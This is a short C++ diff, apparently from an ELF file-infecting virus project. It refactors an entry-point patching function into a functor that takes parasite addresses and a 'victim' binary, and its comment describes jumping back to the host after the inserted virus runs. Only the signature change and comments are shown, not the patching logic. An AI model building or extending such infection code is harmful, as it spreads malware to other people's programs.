@@ -2,10 +2,10 @@
 
 namespace vt::redirection {
 
-bool patch_entry_point(Elf64_Addr parasite_entry_address,
-                       Elf64_Off parasite_file_offset,
-                       Elf64_Off patch_offset_from_parasite_start,
-                       std::span<std::byte> victim) {
+bool EntryPointPatcher::operator()(Elf64_Addr parasite_entry_address,
+                                   Elf64_Off parasite_file_offset,
+                                   Elf64_Off patch_offset_from_parasite_start,
+                                   std::span<std::byte> victim) {
   // For x86-64, patch the jmp address to the original entry point.
   // It is assumed that the inserted virus has at least 8 bytes of noop and
   // that's where it jumps back to host.
